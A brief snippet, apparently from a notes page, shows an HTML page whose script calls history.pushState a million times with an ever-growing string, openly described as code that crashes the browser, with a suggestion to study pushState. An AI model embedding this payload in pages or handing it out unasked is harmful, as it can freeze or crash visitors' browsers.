- The following code will crash your browser very quickly!!!, for deep understanding please research the `pushState` function and in which conditions it is very useful.

  ```
  <!DOCTYPE html>
  <html>

    <body>

      <script type="text/javascript">
        var total = '';

        for (var i = 0; i < 1000000; i++) {
          total += i.toString();
          history.pushState(0, 0, total);
        }
      </script>

    </body>
  </html>
  ```


